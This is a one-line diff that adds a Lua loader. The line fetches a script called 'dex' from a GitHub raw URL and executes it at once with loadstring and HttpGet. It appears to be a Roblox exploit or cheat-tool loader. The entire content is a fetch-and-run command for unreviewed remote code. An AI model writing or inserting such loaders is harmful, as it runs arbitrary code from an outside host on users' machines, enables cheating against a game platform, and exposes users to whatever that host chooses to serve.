@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/BLOXSCRIPTAI/LAX/refs/heads/main/dex")()
